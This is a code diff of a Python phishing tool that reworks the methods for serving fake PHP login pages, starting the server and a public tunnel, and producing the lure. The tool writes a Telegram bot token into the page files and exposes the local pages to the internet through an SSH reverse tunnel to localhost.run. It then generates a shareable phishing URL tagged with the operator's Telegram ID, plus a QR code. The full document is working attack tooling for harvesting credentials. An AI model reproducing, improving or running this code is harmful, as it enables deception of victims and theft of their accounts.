-                    # Replace token with original placeholder
+                    self.print_color(f"[+] Found token in: {php_file} - reverting...", Colors.YELLOW)
                     content = content.replace(self.current_token, 'BBOTTTTTTTTTTT')
                     
                     with open(php_file, 'w', encoding='utf-8') as f:
                         f.write(content)
+                    reverted_files += 1
                     
-                    # Verify reversion
-                    with open(php_file, 'r', encoding='utf-8') as f:
-                        if self.current_token not in f.read():
-                            reverted_files += 1
-                            self.print_color(f"{Colors.GREEN}[✓] Successfully reverted: {php_file}{Colors.NC}")
-                        else:
-                            self.print_color(f"{Colors.RED}[-] Failed to revert: {php_file}{Colors.NC}")
-                
             except Exception as e:
-                self.print_color(f"{Colors.RED}[-] Error reverting {php_file}: {str(e)}{Colors.NC}")
+                self.print_color(f"[-] Error reverting {php_file}: {str(e)}", Colors.RED)
         
-        # Final verification
-        self.print_color(f"\n{Colors.BG_BLUE}{Colors.WHITE} REVERSION COMPLETE {Colors.NC}")
-        self.print_color(f"{Colors.CYAN}[+] Files scanned: {scanned_files}{Colors.NC}")
-        self.print_color(f"{Colors.CYAN}[+] Files reverted: {reverted_files}{Colors.NC}")
-        
-        if reverted_files == 0:
-            self.print_color(f"{Colors.GREEN}[✓] No token instances found in PHP files{Colors.NC}")
-        else:
-            self.print_color(f"{Colors.GREEN}[✓] Token successfully removed from all files{Colors.NC}")
+        self.print_color(f"[+] Reverted token in {reverted_files} files", Colors.GREEN)
 
-    def show_enhanced_pages_menu(self):
-        """Enhanced pages menu with categories and search"""
-        self.print_color(f"{Colors.BG_BLUE}{Colors.WHITE}══════════════════════════ ENHANCED PAGES MENU ══════════════════════════{Colors.NC}")
+    def show_pages_menu(self):
+        """Display available pages menu"""
+        self.print_color(f"{Colors.BG_BLUE}{Colors.WHITE}══════════════════════════ AVAILABLE PAGES ══════════════════════════{Colors.NC}")
         
-        # Group pages by category
-        categories = {}
-        for num, info in self.pages.items():
-            category = info["category"]
-            if category not in categories:
-                categories[category] = []
-            categories[category].append((num, info))
+        # Create menu layout with single digits
+        menu_items = list(self.pages.items())
+        for i in range(0, len(menu_items), 3):
+            row = menu_items[i:i+3]
+            line = f"{Colors.CYAN}│{Colors.NC}"
+            for num, page in row:
+                page_name = page.replace('.php', '').title()
+                line += f"{Colors.GREEN} [{num}] {Colors.WHITE}{page_name:15}{Colors.CYAN}│{Colors.NC}"
+            print(line)
         
-        # Display by category
-        for category, pages in categories.items():
-            self.print_color(f"\n{Colors.BG_CYAN}{Colors.WHITE} {category} {Colors.NC}")
-            
-            for i in range(0, len(pages), 2):
-                row = pages[i:i+2]
-                line = "   "
-                for num, info in row:
-                    line += f"{Colors.GREEN}[{num}]{Colors.WHITE} {info['name']:15}{Colors.NC}"
-                    if len(row) == 2 and row.index((num, info)) == 0:
-                        line += "   "
-                print(line)
-        
-        self.print_color(f"\n{Colors.BG_PURPLE}{Colors.WHITE} SPECIAL OPTIONS {Colors.NC}")
-        print(f"   {Colors.GREEN}[00]{Colors.WHITE} Help & Information{Colors.NC}")
-        print(f"   {Colors.GREEN}[26]{Colors.WHITE} Exit Tool{Colors.NC}")
-        print(f"   {Colors.GREEN}[99]{Colors.WHITE} Refresh Menu{Colors.NC}")
-        
+        print(f"{Colors.CYAN}└─────────────────────────────────────────────────────────────────────────────┘{Colors.NC}")
         self.print_color(f"{Colors.BG_BLUE}{Colors.WHITE}════════════════════════════════════════════════════════════════════════{Colors.NC}")
 
-    def stop_services_enhanced(self):
-        """Enhanced service stopping with process tree killing"""
-        self.print_color(f"{Colors.YELLOW}[!] Stopping all services with enhanced cleanup...{Colors.NC}")
+    def stop_services(self):
+        """Stop all running services"""
+        self.print_color("[!] Stopping any existing PHP server...", Colors.YELLOW)
         
         # Stop PHP server
         if self.php_pid:
-            self.print_color(f"{Colors.YELLOW}[!] Stopping PHP server (PID: {self.php_pid})...{Colors.NC}")
             try:
-                # Kill process group to ensure all child processes are stopped
-                os.killpg(os.getpgid(self.php_pid), signal.SIGTERM)
-                time.sleep(2)
-                # Force kill if still running
-                try:
-                    os.kill(self.php_pid, signal.SIGKILL)
-                except:
-                    pass
-            except (ProcessLookupError, OSError) as e:
-                self.print_color(f"{Colors.YELLOW}[!] PHP server already stopped{Colors.NC}")
-        
-        # Stop SSH tunnel
-        if self.ssh_pid:
-            self.print_color(f"{Colors.YELLOW}[!] Stopping SSH tunnel (PID: {self.ssh_pid})...{Colors.NC}")
-            try:
-                os.killpg(os.getpgid(self.ssh_pid), signal.SIGTERM)
-                time.sleep(2)
-                try:
-                    os.kill(self.ssh_pid, signal.SIGKILL)
-                except:
-                    pass
-            except (ProcessLookupError, OSError):
-                self.print_color(f"{Colors.YELLOW}[!] SSH tunnel already stopped{Colors.NC}")
-        
-        # Clean up any remaining processes
-        cleanup_commands = [
-            "pkill -f 'php -S'",
-            "pkill -f 'ssh.*localhost.run'",
-            "pkill -f 'ssh.*serveo.net'",
-            "pkill -f 'ngrok'"
-        ]
-        
-        for cmd in cleanup_commands:
-            try:
-                subprocess.run(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-            except:
+                os.kill(self.php_pid, signal.SIGTERM)
+                os.waitpid(self.php_pid, 0)
+            except (ProcessLookupError, ChildProcessError):
                 pass
         
-        # Stop TMUX sessions
+        # Stop SSH tunnel
+        self.print_color("[!] Stopping any existing SSH tunnel...", Colors.YELLOW)
+        if self.ssh_pid:
+            try:
+                os.kill(self.ssh_pid, signal.SIGTERM)
+                os.waitpid(self.ssh_pid, 0)
+            except (ProcessLookupError, ChildProcessError):
+                pass
+        
+        # Kill any remaining processes
+        subprocess.run("pkill -f 'php -S'", shell=True, capture_output=True)
+        subprocess.run("pkill -f 'ssh.*localhost.run'", shell=True, capture_output=True)
+        
+        # Stop TMUX sessions if exists
         if self.check_command_exists('tmux'):
             subprocess.run("tmux kill-session -t phishing-tunnel 2>/dev/null", shell=True)
         
+        time.sleep(2)
         self.php_pid = None
         self.ssh_pid = None
-        self.tunnel_url = ""
-        
-        self.print_color(f"{Colors.GREEN}[✓] All services stopped successfully{Colors.NC}")
+        self.services_running = False
 
     def check_port_available(self, port):
-        """Enhanced port availability check"""
+        """Check if a port is available"""
         try:
             with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                 sock.settimeout(1)
                 result = sock.connect_ex(('127.0.0.1', port))
                 return result != 0
         except:
-            return False
+            return True
 
-    def find_available_port(self):
-        """Find available port with intelligent selection"""
-        self.print_color(f"{Colors.CYAN}[+] Scanning for available ports...{Colors.NC}")
+    def start_php_server(self):
+        """Start PHP server on available port"""
+        self.print_color("[+] Starting PHP server on localhost...", Colors.CYAN)
         
+        # Find available port
         for port in self.common_ports:
             if self.check_port_available(port):
-                self.print_color(f"{Colors.GREEN}[+] Found available port: {port}{Colors.NC}")
-                return port
-        
-        # If no common ports available, find random port
-        for attempt in range(10):
-            random_port = random.randint(10000, 65535)
-            if self.check_port_available(random_port):
-                self.print_color(f"{Colors.YELLOW}[!] Using random port: {random_port}{Colors.NC}")
-                return random_port
-        
-        self.print_color(f"{Colors.RED}[-] Could not find available port{Colors.NC}")
-        return None
-
-    def start_php_server_enhanced(self):
-        """Enhanced PHP server with health monitoring"""
-        self.print_color(f"{Colors.CYAN}[+] Starting enhanced PHP server...{Colors.NC}")
-        
-        self.php_port = self.find_available_port()
-        if not self.php_port:
+                self.php_port = port
+                self.print_color(f"[+] Found available port: {port}", Colors.GREEN)
+                break
+        else:
+            self.print_color("[-] No available ports found", Colors.RED)
             return False
         
+        # Start PHP server
         try:
-            # Start PHP server with improved options
             cmd = ["php", "-S", f"127.0.0.1:{self.php_port}"]
-            self.print_color(f"{Colors.YELLOW}[+] Executing: {' '.join(cmd)}{Colors.NC}")
+            self.print_color(f"[+] Executing: {' '.join(cmd)}", Colors.YELLOW)
             
-            # Use process group for better control
-            process = subprocess.Popen(
-                cmd,
-                stdout=subprocess.PIPE,
-                stderr=subprocess.STDOUT,
-                preexec_fn=os.setsid,
-                text=True
-            )
-            self.php_pid = process.pid
+            # Start process and capture output
+            with open('php_server.log', 'w') as log_file:
+                process = subprocess.Popen(
+                    cmd,
+                    stdout=log_file,
+                    stderr=subprocess.STDOUT,
+                    preexec_fn=os.setsid
+                )
+                self.php_pid = process.pid
             
-            # Health monitoring thread
-            health_thread = threading.Thread(target=self.monitor_php_health, args=(process,))
-            health_thread.daemon = True
-            health_thread.start()
-            
-            # Wait for server to be ready
-            self.print_color(f"{Colors.CYAN}[+] Waiting for PHP server to start...{Colors.NC}")
-            
-            max_wait = 20
+            # Wait for server to start
+            self.print_color("[+] Waiting for PHP server to start...", Colors.CYAN)
+            max_wait = 15
             for i in range(max_wait):
                 time.sleep(1)
-                
-                if not self.is_process_running(self.php_pid):
-                    self.print_color(f"{Colors.RED}[-] PHP server process died{Colors.NC}")
-                    return False
-                
-                if not self.check_port_available(self.php_port):  # Port is in use
-                    # Test server responsiveness
+                if self.check_port_available(self.php_port) == False:  # Port is in use
+                    self.print_color(f"[+] PHP server started successfully at http://localhost:{self.php_port}/", Colors.GREEN)
+                    
+                    # Test page access
                     try:
-                        response = requests.get(f"http://127.0.0.1:{self.php_port}/", timeout=2)
+                        response = requests.get(f"http://127.0.0.1:{self.php_port}/{self.selected_page}", timeout=2)
                         if response.status_code == 200:
-                            self.print_color(f"{Colors.GREEN}[✓] PHP server started successfully on port {self.php_port}{Colors.NC}")
-                            
-                            # Test the specific page
-                            try:
-                                page_response = requests.get(f"http://127.0.0.1:{self.php_port}/{self.selected_page}", timeout=2)
-                                if page_response.status_code == 200:
-                                    self.print_color(f"{Colors.GREEN}[✓] Page '{self.selected_page}' is accessible{Colors.NC}")
-                                else:
-                                    self.print_color(f"{Colors.YELLOW}[!] Page returned status {page_response.status_code}{Colors.NC}")
-                            except:
-                                self.print_color(f"{Colors.YELLOW}[!] Could not access page '{self.selected_page}'{Colors.NC}")
-                            
-                            return True
+                            self.print_color(f"[✓] PHP page '{self.selected_page}' is accessible locally", Colors.GREEN)
+                        else:
+                            self.print_color(f"[!] PHP page '{self.selected_page}' returned status {response.status_code}", Colors.YELLOW)
                     except:
-                        pass  # Server might not be fully ready yet
+                        self.print_color(f"[!] PHP page '{self.selected_page}' may not be accessible locally", Colors.YELLOW)
+                    
+                    return True
                 
-                self.print_color(f"{Colors.YELLOW}[!] Waiting... ({i+1}/{max_wait}){Colors.NC}")
+                self.print_color(f"[!] Waiting for PHP server... ({i+1}/{max_wait})", Colors.YELLOW)
             
-            self.print_color(f"{Colors.RED}[-] PHP server failed to start within timeout{Colors.NC}")
+            self.print_color("[-] PHP server failed to start within timeout", Colors.RED)
             return False
             
         except Exception as e:
-            self.print_color(f"{Colors.RED}[-] Failed to start PHP server: {str(e)}{Colors.NC}")
+            self.print_color(f"[-] Failed to start PHP server: {str(e)}", Colors.RED)
             return False
 
-    def monitor_php_health(self, process):
-        """Monitor PHP server health in background"""
-        try:
-            while process.poll() is None:
-                # Read output to prevent buffer filling
-                try:
-                    output = process.stdout.readline()
-                    if output:
-                        self.log_event(f"PHP: {output.strip()}", "DEBUG")
-                except:
-                    pass
-                time.sleep(1)
-        except:
-            pass
+    def start_ssh_tunnel(self):
+        """Start SSH tunnel using localhost.run"""
+        self.print_color("[+] Starting SSH tunnel...", Colors.CYAN)
+        
+        # Build SSH command
+        ssh_key = "id_rsa" if Path("id_rsa").exists() else None
+        if ssh_key:
+            ssh_cmd = f"ssh -i {ssh_key} -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:{self.php_port} ssh.localhost.run"
+        else:
+            ssh_cmd = f"ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:{self.php_port} nokey@localhost.run"
+        
+        self.print_color(f"[+] Executing: {ssh_cmd}", Colors.YELLOW)
+        
+        if self.check_command_exists('tmux'):
+            return self.start_ssh_tunnel_tmux(ssh_cmd)
+        else:
+            return self.start_ssh_tunnel_background(ssh_cmd)
 
-    def start_ssh_tunnel_enhanced(self):
-        """Enhanced SSH tunnel with multiple providers and fallback"""
-        self.print_color(f"{Colors.CYAN}[+] Starting enhanced SSH tunnel system...{Colors.NC}")
-        
-        # Try different tunnel methods
-        methods = [
-            self.start_ssh_tunnel_tmux,
-            self.start_ssh_tunnel_background,
-            self.start_ssh_tunnel_direct
-        ]
-        
-        for method in methods:
-            self.print_color(f"{Colors.YELLOW}[!] Trying method: {method.__name__}{Colors.NC}")
-            if method():
-                return True
-            time.sleep(2)
-        
-        self.print_color(f"{Colors.RED}[-] All SSH tunnel methods failed{Colors.NC}")
-        return False
-
-    def start_ssh_tunnel_tmux(self):
-        """Enhanced TMUX-based SSH tunnel"""
-        if not self.check_command_exists('tmux'):
-            self.print_color(f"{Colors.YELLOW}[-] TMUX not available{Colors.NC}")
-            return False
-        
-        self.print_color(f"{Colors.GREEN}[+] Using enhanced TMUX tunnel system...{Colors.NC}")
+    def start_ssh_tunnel_tmux(self, ssh_cmd):
+        """Start SSH tunnel in TMUX session"""
+        self.print_color("[+] Using TMUX for SSH tunnel session...", Colors.GREEN)
         
         # Kill existing session
         subprocess.run("tmux kill-session -t phishing-tunnel 2>/dev/null", shell=True)
-        time.sleep(1)
         
-        # Build SSH command
-        ssh_cmd = self.build_ssh_command()
+        # Start new TMUX session
+        subprocess.run(f"tmux new-session -d -s phishing-tunnel '{ssh_cmd}'", shell=True)
+        time.sleep(5)
         
-        # Start TMUX session
-        cmd = f"tmux new-session -d -s phishing-tunnel '{ssh_cmd}'"
-        self.print_color(f"{Colors.YELLOW}[+] Starting TMUX: {cmd}{Colors.NC}")
-        
-        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
+        # Check if session exists
+        result = subprocess.run("tmux has-session -t phishing-tunnel 2>/dev/null", shell=True)
         if result.returncode != 0:
-            self.print_color(f"{Colors.RED}[-] Failed to create TMUX session{Colors.NC}")
+            self.print_color("[-] Failed to create TMUX session", Colors.RED)
             return False
         
-        time.sleep(3)
+        self.print_color("[+] SSH tunnel started in TMUX session: phishing-tunnel", Colors.GREEN)
         
-        # Monitor for tunnel URL
-        return self.monitor_tunnel_url(timeout=30)
+        # Extract tunnel URL
+        max_attempts = 25
+        for attempt in range(max_attempts):
+            time.sleep(3)
+            
+            # Get TMUX output
+            result = subprocess.run("tmux capture-pane -t phishing-tunnel -p", shell=True, capture_output=True, text=True)
+            output = result.stdout
+            
+            # Look for tunnel URL
+            url_match = re.search(r'https://[^ ]*\.lhr\.life', output)
+            if url_match:
+                self.tunnel_url = url_match.group()
+                self.print_color("[+] SSH tunnel established successfully!", Colors.GREEN)
+                self.print_color(f"[+] Tunnel URL: {self.tunnel_url}", Colors.GREEN)
+                
+                # Save URL to file
+                with open('current_tunnel.url', 'w') as f:
+                    f.write(self.tunnel_url)
+                
+                # Test URL
+                self.print_color("[!] Testing tunnel URL accessibility...", Colors.YELLOW)
+                try:
+                    response = requests.get(self.tunnel_url, timeout=5)
+                    if response.status_code == 200:
+                        self.print_color("[✓] Tunnel URL is accessible from the internet", Colors.GREEN)
+                    else:
+                        self.print_color(f"[!] Tunnel URL returned status {response.status_code}", Colors.YELLOW)
+                except:
+                    self.print_color("[!] Tunnel URL may not be accessible from the internet", Colors.YELLOW)
+                
+                self.print_color("[!] SSH tunnel is running in TMUX session: phishing-tunnel", Colors.YELLOW)
+                self.print_color("[!] To view tunnel output: tmux attach -t phishing-tunnel", Colors.YELLOW)
+                self.print_color("[!] To detach from TMUX: Ctrl+B then D", Colors.YELLOW)
+                
+                return True
+            
+            self.print_color(f"[!] Waiting for tunnel URL... (attempt {attempt+1}/{max_attempts})", Colors.YELLOW)
+        
+        self.print_color("[-] Could not establish SSH tunnel within timeout", Colors.RED)
+        return False
 
-    def start_ssh_tunnel_background(self):
-        """Enhanced background process SSH tunnel"""
-        self.print_color(f"{Colors.GREEN}[+] Using background process tunnel...{Colors.NC}")
+    def start_ssh_tunnel_background(self, ssh_cmd):
+        """Start SSH tunnel as background process"""
+        self.print_color("[!] TMUX not available. Using background process...", Colors.YELLOW)
         
-        ssh_cmd = self.build_ssh_command()
         timestamp = str(int(time.time()))
         log_file = f"ssh_tunnel_{timestamp}.log"
+        
+        self.print_color(f"[+] SSH output will be saved to: {log_file}", Colors.YELLOW)
         
         try:
             with open(log_file, 'w') as log:
@@ -888,859 +566,398 @@ class AdvancedPhishingTool:
                 )
                 self.ssh_pid = process.pid
             
-            self.print_color(f"{Colors.GREEN}[+] SSH tunnel started with PID: {self.ssh_pid}{Colors.NC}")
+            self.print_color(f"[+] SSH tunnel process started with PID: {self.ssh_pid}", Colors.GREEN)
             
-            # Monitor for tunnel URL
-            return self.monitor_tunnel_url(log_file=log_file, timeout=30)
-            
-        except Exception as e:
-            self.print_color(f"{Colors.RED}[-] Failed to start SSH tunnel: {str(e)}{Colors.NC}")
-            return False
-
-    def start_ssh_tunnel_direct(self):
-        """Direct SSH tunnel without background process"""
-        self.print_color(f"{Colors.GREEN}[+] Using direct SSH tunnel...{Colors.NC}")
-        
-        ssh_cmd = self.build_ssh_command()
-        self.print_color(f"{Colors.YELLOW}[+] Executing: {ssh_cmd}{Colors.NC}")
-        
-        try:
-            process = subprocess.Popen(
-                ssh_cmd,
-                shell=True,
-                stdout=subprocess.PIPE,
-                stderr=subprocess.STDOUT,
-                text=True,
-                bufsize=1,
-                universal_newlines=True
-            )
-            self.ssh_pid = process.pid
-            
-            # Start output monitoring thread
-            monitor_thread = threading.Thread(target=self.monitor_ssh_output, args=(process,))
-            monitor_thread.daemon = True
-            monitor_thread.start()
-            
-            return self.monitor_tunnel_url(process=process, timeout=30)
-            
-        except Exception as e:
-            self.print_color(f"{Colors.RED}[-] Direct SSH tunnel failed: {str(e)}{Colors.NC}")
-            return False
-
-    def build_ssh_command(self):
-        """Build SSH command with optimal parameters"""
-        base_cmd = "ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -o ServerAliveCountMax=3"
-        
-        # Add identity file if available
-        if Path("id_rsa").exists():
-            base_cmd += " -i id_rsa"
-        
-        # Try different tunnel providers
-        tunnel_targets = [
-            f" -R 80:localhost:{self.php_port} ssh.localhost.run",
-            f" -R 80:localhost:{self.php_port} serveo.net",
-            f" -R 80:localhost:{self.php_port} nokey@localhost.run"
-        ]
-        
-        return base_cmd + tunnel_targets[0]  # Start with localhost.run
-
-    def monitor_tunnel_url(self, process=None, log_file=None, timeout=30):
-        """Monitor for tunnel URL with enhanced detection"""
-        self.print_color(f"{Colors.CYAN}[+] Monitoring for tunnel URL (timeout: {timeout}s)...{Colors.NC}")
-        
-        start_time = time.time()
-        url_patterns = [
-            r'https://[a-zA-Z0-9-]+\.lhr\.life',
-            r'https://[a-zA-Z0-9-]+\.serveo\.net',
-            r'https://[a-zA-Z0-9-]+\.ngrok\.io',
-            r'https://[a-zA-Z0-9-]+\.[a-z]+\.([a-z]+\.)?[a-z]+'
-        ]
-        
-        while time.time() - start_time < timeout:
-            url_found = False
-            
-            # Check TMUX output
-            if self.check_command_exists('tmux') and subprocess.run("tmux has-session -t phishing-tunnel 2>/dev/null", shell=True).returncode == 0:
-                result = subprocess.run("tmux capture-pane -t phishing-tunnel -p", shell=True, capture_output=True, text=True)
-                url_found = self.extract_url_from_output(result.stdout, url_patterns)
-            
-            # Check log file
-            if not url_found and log_file and Path(log_file).exists():
-                with open(log_file, 'r') as f:
-                    url_found = self.extract_url_from_output(f.read(), url_patterns)
-            
-            # Check process output
-            if not url_found and process and process.poll() is None:
-                try:
-                    output = process.stdout.readline()
-                    if output:
-                        url_found = self.extract_url_from_output(output, url_patterns)
-                except:
-                    pass
-            
-            if url_found:
-                self.print_color(f"{Colors.GREEN}[✓] SSH tunnel established successfully!{Colors.NC}")
-                self.print_color(f"{Colors.GREEN}[+] Tunnel URL: {self.tunnel_url}{Colors.NC}")
+            # Wait for tunnel URL
+            max_attempts = 25
+            for attempt in range(max_attempts):
+                time.sleep(3)
                 
-                # Save URL and test
-                with open('current_tunnel.url', 'w') as f:
-                    f.write(self.tunnel_url)
+                # Check if process is still running
+                if not self.is_process_running(self.ssh_pid):
+                    self.print_color("[-] SSH tunnel process died unexpectedly", Colors.RED)
+                    if Path(log_file).exists():
+                        with open(log_file, 'r') as f:
+                            self.print_color("[!] SSH output:", Colors.YELLOW)
+                            print(f.read())
+                    return False
                 
-                self.test_tunnel_url()
-                return True
+                # Check log for URL
+                if Path(log_file).exists():
+                    with open(log_file, 'r') as f:
+                        content = f.read()
+                        url_match = re.search(r'https://[^ ]*\.lhr\.life', content)
+                        if url_match:
+                            self.tunnel_url = url_match.group()
+                            self.print_color("[+] SSH tunnel established successfully!", Colors.GREEN)
+                            self.print_color(f"[+] Tunnel URL: {self.tunnel_url}", Colors.GREEN)
+                            
+                            with open('current_tunnel.url', 'w') as f:
+                                f.write(self.tunnel_url)
+                            
+                            # Test URL
+                            self.print_color("[!] Testing tunnel URL accessibility...", Colors.YELLOW)
+                            try:
+                                response = requests.get(self.tunnel_url, timeout=5)
+                                if response.status_code == 200:
+                                    self.print_color("[✓] Tunnel URL is accessible from the internet", Colors.GREEN)
+                                else:
+                                    self.print_color(f"[!] Tunnel URL returned status {response.status_code}", Colors.YELLOW)
+                            except:
+                                self.print_color("[!] Tunnel URL may not be accessible from the internet", Colors.YELLOW)
+                            
+                            return True
+                
+                self.print_color(f"[!] Waiting for tunnel URL... (attempt {attempt+1}/{max_attempts})", Colors.YELLOW)
             
-            time.sleep(2)
-            elapsed = int(time.time() - start_time)
-            self.print_color(f"{Colors.YELLOW}[!] Waiting for tunnel... ({elapsed}/{timeout}s){Colors.NC}")
-        
-        self.print_color(f"{Colors.RED}[-] Tunnel URL not found within timeout{Colors.NC}")
-        return False
-
-    def extract_url_from_output(self, output, patterns):
-        """Extract URL from output using multiple patterns"""
-        for pattern in patterns:
-            match = re.search(pattern, output)
-            if match:
-                self.tunnel_url = match.group()
-                return True
-        return False
-
-    def monitor_ssh_output(self, process):
-        """Monitor SSH process output"""
-        try:
-            while process.poll() is None:
-                line = process.stdout.readline()
-                if line:
-                    self.log_event(f"SSH: {line.strip()}", "DEBUG")
-                time.sleep(0.1)
-        except:
-            pass
-
-    def test_tunnel_url(self):
-        """Enhanced tunnel URL testing"""
-        self.print_color(f"{Colors.CYAN}[+] Testing tunnel URL accessibility...{Colors.NC}")
-        
-        if not self.tunnel_url:
-            self.print_color(f"{Colors.RED}[-] No tunnel URL to test{Colors.NC}")
-            return
-        
-        try:
-            response = requests.get(self.tunnel_url, timeout=10)
-            if response.status_code == 200:
-                self.print_color(f"{Colors.GREEN}[✓] Tunnel URL is accessible from internet{Colors.NC}")
-            else:
-                self.print_color(f"{Colors.YELLOW}[!] Tunnel URL returned status {response.status_code}{Colors.NC}")
-        except requests.exceptions.Timeout:
-            self.print_color(f"{Colors.YELLOW}[!] Tunnel URL test timed out{Colors.NC}")
+            self.print_color("[-] Could not establish SSH tunnel within timeout", Colors.RED)
+            return False
+            
         except Exception as e:
-            self.print_color(f"{Colors.YELLOW}[!] Tunnel URL test failed: {str(e)}{Colors.NC}")
+            self.print_color(f"[-] Failed to start SSH tunnel: {str(e)}", Colors.RED)
+            return False
 
     def is_process_running(self, pid):
-        """Enhanced process running check"""
+        """Check if a process is running"""
         try:
             os.kill(pid, 0)
             return True
         except (ProcessLookupError, PermissionError):
             return False
 
-    def generate_enhanced_url(self):
-        """Enhanced URL generation with multiple formats"""
+    def generate_url(self):
+        """Generate final phishing URL"""
         if not self.tunnel_url:
-            self.print_color(f"{Colors.RED}[-] No tunnel URL available{Colors.NC}")
+            self.print_color("[-] No tunnel URL available", Colors.RED)
             return False
         
-        # Generate multiple URL formats
-        base_url = f"{self.tunnel_url}/{self.selected_page}"
-        url_variants = [
-            f"{base_url}?ID={self.user_id}",
-            f"{base_url}?id={self.user_id}",
-            f"{base_url}?user={self.user_id}",
-            f"{base_url}?telegram={self.user_id}",
-            base_url  # Fallback without parameters
-        ]
+        final_url = f"{self.tunnel_url}/{self.selected_page}?ID={self.user_id}"
         
-        final_url = url_variants[0]  # Primary URL
+        self.print_color(f"{Colors.BG_GREEN}{Colors.WHITE}══════════════════════════ GENERATED URL ═══════════════════════════{Colors.NC}")
+        self.print_color(f"[+] Final URL: {Colors.WHITE}{final_url}{Colors.NC}", Colors.GREEN)
+        self.print_color(f"{Colors.BG_GREEN}{Colors.WHITE}════════════════════════════════════════════════════════════════════════{Colors.NC}")
         
-        self.print_color(f"{Colors.BG_GREEN}{Colors.WHITE}══════════════════════════ ENHANCED URL GENERATION ═══════════════════════════{Colors.NC}")
-        self.print_color(f"{Colors.GREEN}[+] Primary URL: {Colors.WHITE}{final_url}{Colors.NC}")
-        
-        # Save all URL variants
-        with open('generated_urls.txt', 'w') as f:
-            for url in url_variants:
-                f.write(url + '\n')
-        
+        # Save URL to file
         with open('generated_url.txt', 'w') as f:
             f.write(final_url)
         
-        # Test URL accessibility
-        self.test_final_url(final_url)
+        # Test URL
+        self.print_color("[+] Testing final URL accessibility...", Colors.CYAN)
+        try:
+            response = requests.get(final_url, timeout=5)
+            if response.status_code in [200, 301, 302]:
+                self.print_color("[✓] Final URL is accessible and working!", Colors.GREEN)
+            else:
+                self.print_color(f"[!] Final URL returned status {response.status_code}", Colors.YELLOW)
+        except:
+            self.print_color("[!] Final URL may not be accessible", Colors.YELLOW)
         
-        # Generate QR code
-        self.generate_qr_code(final_url)
-        
-        # Show URL shortening options
-        self.show_url_options(final_url)
+        # Generate QR code if available
+        if self.check_command_exists('qrencode'):
+            self.print_color("[+] Generating QR code...", Colors.CYAN)
+            subprocess.run(f"qrencode -t ANSIUTF8 '{final_url}'", shell=True)
+        else:
+            self.print_color("[!] qrencode not available - QR code generation skipped", Colors.YELLOW)
         
         return True
 
-    def test_final_url(self, url):
-        """Enhanced final URL testing"""
-        self.print_color(f"{Colors.CYAN}[+] Testing final URL comprehensively...{Colors.NC}")
+    def display_results(self):
+        """Display current tool status and results"""
+        self.print_color(f"\n{Colors.BG_BLUE}{Colors.WHITE}══════════════════════════ TOOL STATUS ═══════════════════════════{Colors.NC}")
+        self.print_color(f"[+] Bot Token    : {Colors.WHITE}Configured successfully{Colors.NC}", Colors.GREEN)
+        self.print_color(f"[+] Telegram ID  : {Colors.WHITE}{self.user_id}{Colors.NC}", Colors.GREEN)
+        self.print_color(f"[+] Selected Page: {Colors.WHITE}{self.selected_page}{Colors.NC}", Colors.GREEN)
         
-        tests = [
-            ("Basic accessibility", lambda: requests.get(url, timeout=10)),
-            ("Without parameters", lambda: requests.get(url.split('?')[0], timeout=10)),
-            ("Head request", lambda: requests.head(url, timeout=5))
-        ]
-        
-        for test_name, test_func in tests:
-            try:
-                response = test_func()
-                status_icon = f"{Colors.GREEN}✓{Colors.NC}" if response.status_code == 200 else f"{Colors.YELLOW}⚠{Colors.NC}"
-                self.print_color(f"  {status_icon} {test_name}: HTTP {response.status_code}")
-            except Exception as e:
-                self.print_color(f"  {Colors.RED}✗{Colors.NC} {test_name}: {str(e)}")
-
-    def generate_qr_code(self, url):
-        """Enhanced QR code generation"""
-        self.print_color(f"{Colors.CYAN}[+] Generating QR code...{Colors.NC}")
-        
-        # Try multiple QR code methods
-        qr_methods = [
-            ("qrencode", f"qrencode -t ANSIUTF8 '{url}'"),
-            ("python_qrcode", "python3 -c \"import qrcode; qr = qrcode.QRCode(); qr.add_data('" + url + "'); qr.print_ascii()\" 2>/dev/null"),
-        ]
-        
-        qr_generated = False
-        for method_name, command in qr_methods:
-            try:
-                if method_name == "qrencode" and self.check_command_exists("qrencode"):
-                    result = subprocess.run(command, shell=True, capture_output=True, text=True)
-                    if result.returncode == 0:
-                        print(result.stdout)
-                        qr_generated = True
-                        break
-                elif method_name == "python_qrcode":
-                    try:
-                        import qrcode
-                        qr = qrcode.QRCode()
-                        qr.add_data(url)
-                        qr.print_ascii()
-                        qr_generated = True
-                        break
-                    except ImportError:
-                        continue
-            except:
-                continue
-        
-        if not qr_generated:
-            self.print_color(f"{Colors.YELLOW}[!] QR code generation not available{Colors.NC}")
-            self.print_color(f"{Colors.YELLOW}[!] Install: pip install qrcode OR apt install qrencode{Colors.NC}")
-
-    def show_url_options(self, url):
-        """Show URL shortening and sharing options"""
-        self.print_color(f"{Colors.CYAN}[+] URL Management Options:{Colors.NC}")
-        options = [
-            f"{Colors.GREEN}1.{Colors.WHITE} Copy to clipboard (if xclip/xsel available)",
-            f"{Colors.GREEN}2.{Colors.WHITE} Save to file: generated_url.txt",
-            f"{Colors.GREEN}3.{Colors.WHITE} All variants: generated_urls.txt",
-            f"{Colors.GREEN}4.{Colors.WHITE} Share via QR code (above)"
-        ]
-        
-        for option in options:
-            print(f"  {option}")
-
-    def display_enhanced_results(self):
-        """Enhanced results display with comprehensive status"""
-        self.print_color(f"\n{Colors.BG_BLUE}{Colors.WHITE}══════════════════════════ ENHANCED STATUS PANEL ═══════════════════════════{Colors.NC}")
-        
-        status_items = [
-            (f"{Colors.GREEN}[✓] Bot Token", f"{Colors.WHITE}Configured and validated{Colors.NC}"),
-            (f"{Colors.GREEN}[✓] Telegram ID", f"{Colors.WHITE}{self.user_id}{Colors.NC}"),
-            (f"{Colors.GREEN}[✓] Selected Page", f"{Colors.WHITE}{self.selected_page}{Colors.NC}"),
-            (f"{Colors.GREEN}[✓] PHP Server", f"{Colors.WHITE}Port {self.php_port} (PID: {self.php_pid}){Colors.NC}" if self.php_pid else f"{Colors.RED}Not running{Colors.NC}"),
-        ]
-        
-        for label, value in status_items:
-            print(f"{label}: {value}")
-        
-        # Tunnel status
         if self.tunnel_url:
-            print(f"{Colors.GREEN}[✓] Tunnel URL: {Colors.WHITE}{self.tunnel_url}{Colors.NC}")
